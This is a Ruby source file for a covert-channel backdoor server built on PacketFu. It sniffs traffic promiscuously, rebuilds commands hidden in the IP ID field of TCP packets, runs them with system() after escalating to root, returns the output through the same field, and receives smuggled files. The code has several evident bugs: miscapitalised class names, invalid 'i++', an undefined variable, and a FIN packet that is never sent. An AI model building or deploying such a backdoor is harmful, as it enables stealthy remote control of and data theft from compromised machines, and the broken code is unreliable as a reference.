#!/usr/bin/env ruby
require 'rubygems'
require 'optparse'
require 'packetfu'




# -----------------------------------------------------------------------------------------
# print_usage()
#
# Prints the application usage information.
# 
# -----------------------------------------------------------------------------------------
def print_usage()
    puts "Hello World"
end

# -----------------------------------------------------------------------------------------
#	listen()
#    
# Listens for packets on the specified interface. Our dispatcher logic is here. Listen for
# specific client commands (get). Future additions - add funcitonality to grab a file from
# the server? Configure server settings? Restart script?
#
# -----------------------------------------------------------------------------------------
def listen()

	cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true, :promisc =>true)
	command = nil
	cap.stream.each do | pkt |
	
		if PacketFu::TCPPacket.can_parse?(pkt) then
			packet = packetFu::Packet.parse(pkt)
				# if a FIN comes in then we have our complete command
				if packet.tcp_flags.fin == 1 then
					commands = command.split(' ')
					if commands[0] == "put" 	# client is sending us a file
						puts(filename)				
						recv_file(commands[1], packet) 	# filename
					else 
						puts(command)				# client sent us a command
						exec_command(command, packet)
					end
				else #not a fin packet recieved
					if command.nil? then
						command = packet.ip_id.to_s()
					else
						command += packet.ip_id.to_s()
					end
				end #FIN
		end #can parse
	end #capture
		
end

# -----------------------------------------------------------------------------------------
#	exec_command(command)
#    
# Executes a command on the server, grabes the output and sends it back to the client.
#
# -----------------------------------------------------------------------------------------
def exec_command(command, packet)

	result = system(command)
	if result.nil? 
		result = "-bash:" + command + ": command not found."
	end
	
	#send result back to client
	send_data(result, packet)
	listen()
	
end
# -----------------------------------------------------------------------------------------
#	recv_file(command)
#    
# Recieves a file from the client.
# -----------------------------------------------------------------------------------------
def recv_file(filename, packet)
	
	#don't overwrite files, just create other versions. Generates unique filename
	fname = filename
	i = 1
	until File.exists?(filename) == false do
		filename = fname + "_"+i
		i++
	end
	puts "Writing file " + filename
	#got a unique filename so start recieving filename
	cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true, :promisc =>true)
	contents = nil
	cap.stream.each do | pkt |
		if PacketFu::TCPPacket.can_parse?(pkt) then
			packet = packetFu::Packet.parse(pkt)
			if(packet.tcp_flags.fin == 1)
				break			
			end			
			if contents.nil?			
				contents = packet.ip_id
			else
				contents += packet.ip_id			
			end		
		end
	end


	file = File.open(filename, 'w') do |file|
		file.puts(contents)
	end
	send_data("Server says: File saved " +filename);
	
	
end
# -----------------------------------------------------------------------------------------
#	send_data(string)
#    
# Sends data back to the client followed by a FIN packet to indicate completion.
#
# -----------------------------------------------------------------------------------------
def send_data(string, packet)
	pkt = PacketFu::TCPPacket.new
	#send the data
	string.each_byte do |char|
		pkt.ip_src = packet.ip_daddr #the servers ip
		pkt.ip_dst = packet.ip_saddr #the senders ip
		pkt.tcp_flags = PacketFu::TcpFlags.new(:syn => 1)	
		pkt.ip_id = char
		pkt.recalc
		pkt.to_w(@options[:iface])
	end
	#send a FIN to indicate completion
	pkt_f = PacketFu::TCPPacket.new
	pkt_f.ip_src = packet.ip_daddr
	pkt_f.ip_dst = packet.ip_saddr
	pkt_f.tcp_flags = PacketFu::TcpFlags.new(:fin => 1)
	pkt_f.recalc
	pkt.to_w(@options[:iface])

end
# -----------------------------------------------------------------------------------------
#
#    Application entry point. Get options, make root, and waits for input
#
# -----------------------------------------------------------------------------------------
@options = {}

# Set defaults for options
@options[:iface] = "em1" 
@options[:filter] = nil
optparser = OptionParser.new do | opts |
    
    opts.on('-h', '--help','Display usage') do
        print_usage()    

    end
    opts.on('-s' '--source-ip SOURCE IP','The client\'s IP.') do |s|
        @options[:source_ip] = s;    
    end
    opts.on('-d' '--dest-ip DESTINATION IP','The servers\'s IP.') do |d|
        @options[:dest_ip] = d;    
    end
    opts.on('-p' '--port LISTEN PORT','The port to listen on.') do |p|
        @options[:port] = p;    
    end
    opts.on('-i' '--iface INTERFACE','The interface to listen on.') do |i|
        @options[:iface] = i;    
    end
    opts.on('-f' '--filter FiLTER','The filter to listen on. For optional override.') do |f|
        @options[:filter] = f;    
    end
end.parse! #optparse

Process.change_privilege(0) #make root

#usually filter isnt supplied but that's okay. We'll build it ourself.
if @options[:filter].nil ?
	@options[:filter] = "-i " + @options[:iface] + " src port " + @options[:port]
	if(@options[:source_ip]) #include source-ip filtering
		@options[:filter] +=" and src host" + @options[:source_ip];

	end 
end
listen()

